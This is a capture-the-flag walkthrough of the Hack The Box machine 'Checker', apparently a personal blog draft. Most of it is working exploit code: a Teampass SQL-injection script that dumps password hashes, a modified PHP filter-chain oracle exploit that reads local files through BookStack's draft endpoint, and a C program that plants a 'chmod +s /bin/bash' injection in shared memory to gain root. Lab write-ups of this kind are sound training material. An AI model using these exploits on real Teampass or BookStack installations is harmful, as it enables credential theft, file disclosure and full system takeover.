---
title: "Checker Walkthrough(Hack The Box)"
date: 2025-06-01
draft: true
description: "a description"
tags: ["Linux", "Hard", "Hack the Box", "Hacking", "Web", "Walkthrough"]
---
## Reconnaissance & Enumeration
- Nmap scan results:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    Apache httpd
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 403 Forbidden
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 41.111 days (since Mon Jan 13 12:22:15 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   146.07 ms 10.10.14.1
2   143.80 ms 10.10.11.56

NSE: Script Post-scanning.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.40 seconds
           Raw packets sent: 1700 (75.586KB) | Rcvd: 1045 (61.306KB)

```
- Uniquely this website has two extra web service ports.
- Port 80 had `BookStack` login page, where port 8080 had Teampass login page
- Port `80`:
- ![[Pasted image 20250223151928.png]]
- Port `8080`:
- ![[Pasted image 20250223151952.png]]
## Exploitation
- This Teampass is affected by SQLi vulnerability from 2023. We can read more from [here](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612) and we can also get a POC 
- Here is the POC:
```bash
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```
- On running it I got the two user hashes
- ![[Pasted image 20250223154258.png]]
- Only one bcrypt hash can be cracked
- ![[Pasted image 20250223154322.png]]
- Logged into Teampass. Got two set of credentials one for Bookstack, which worked and another for ssh as user `reader`. but It asks for verification code to login
- ![[Pasted image 20250223155349.png]]
- After logging into bookstack we can see it's version in the source code and it has a vulnerability
- This version of Bookstack is affected by [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/CVE-2023-6199). This [article](https://fluidattacks.com/advisories/imagination/) explains little further into this vulnerability
- Also there are more info [here](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/)
- [Exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) to this vulnerability
- We have to make a little change to `requester.py` in the exploit
```python
import json
import requests
import time
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import re
import base64

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False



    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Used to parse the option parameter sent by the user
    """
    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter: # Parse array elements
            
            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        b64_chain = base64.b64encode(filter_chain.encode('utf-8')).decode('utf-8')
        img_chain = f"<img src='data:image/png;base64,{b64_chain}'/>"
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(img_chain) 
        # Make the request, the verb and data encoding is defined
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input: 
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:
            # DEBUG print("PATT", (self.match in requ.text))
            return self.match in requ.text 

        if self.time_based_attack:
            # DEBUG print("ELAP", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        # DEBUG print("CODE", requ.status_code == 500)
        return requ.status_code == 500

```
- Here is the modified version which makes this exploit little faster
- We have to create a draft page and use the correct UID in the payload to exploit this
```
python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/<UID>/save-draft' --verb PUT --parameter html --headers '{"Content-Type":"application/x-www-form-urlencoded","X-CSRF-TOKEN":"YourToken","Cookie":"bookstack_session=<YourCookie>"}' --file "/etc/passwd"
```
- ![[Pasted image 20250223173424.png]]
- The exploit is very very slow
- Remember It was asking for verification code before. We can find the secret to generate the verification code from here `/backup/home_backup/home/reader/.google_authenticator`
- We can get secret to generate the code Verification code.
- ![[Pasted image 20250223184916.png]]
- I used this [website](https://it-tools.tech/otp-generator) to generate my code 
- Initially I was getting this error `Operation not permitted to write config` But after changing the VPN to US I got logged in 
- Got the user flag
- ![[Pasted image 20250223185124.png]]
## Privilege Escalation
- User reader has sudo permission to run this script
- ![[Pasted image 20250223190215.png]]
- This script checks for some leaked hashes with a submission of username to it
- We can abuse this by guessing the shared memory of previous execution. 
- This is the vulnerable part
- ![[Pasted image 20250223200427.png]]
- **Code to exploit:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#define SHM_SIZE 0x400  // 1024 bytes
#define SHM_MODE 0x3B6  // Permissions: 0666 in octal

int main(void) {
    // Seed the random number generator with the current time.
    time_t current_time = time(NULL);
    srand((unsigned int)current_time);

    // Generate a random number and apply modulo 0xfffff to generate the key.
    int random_value = rand();
    key_t key = random_value % 0xfffff;

    // Print the generated key in hexadecimal.
    printf("Generated key: 0x%X\n", key);

    // Create (or get) the shared memory segment with the generated key.
    // IPC_CREAT flag is used to create the segment if it does not exist.
    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);
    if (shmid == -1) {
        perror("shmget");
        exit(EXIT_FAILURE);
    }

    // Attach to the shared memory segment.
    char *shmaddr = (char *)shmat(shmid, NULL, 0);
    if (shmaddr == (char *)-1) {
        perror("shmat");
        exit(EXIT_FAILURE);
    }

    // Define the payload string to be written.
    const char *payload = "Leaked hash detected at Sat Feb 22 23:21:48 2025 > '; chmod +s /bin/bash;#";

    // Write the payload to the shared memory segment.
    snprintf(shmaddr, SHM_SIZE, "%s", payload);

    // Optionally, print the content that was written.
    printf("Shared Memory Content:\n%s\n", shmaddr);

    // Detach from the shared memory segment.
    if (shmdt(shmaddr) == -1) {
        perror("shmdt");
        exit(EXIT_FAILURE);
    }

    return 0;
}

```
- The above c code will randomly guess the shared memory of a previous execution and try to inject this command to  `; chmod +s /bin/bash` a time stamp
- Compile the above code `gcc -o exploit exploit.c`
- I made two scripts
- *Script-1*
```
#!/bin/bash
while true; do
  /home/reader/exploit
done
```
- *Script-2*
```
#!/bin/bash
while true; do
    sudo /opt/hash-checker/check-leak.sh bob
done
```
- After giving necessary permissions I ran those scripts at same time,
- After some minutes I executed `/bin/bash -p`. Now I am root
- Got the root flag
- ![[Pasted image 20250223194658.png]]
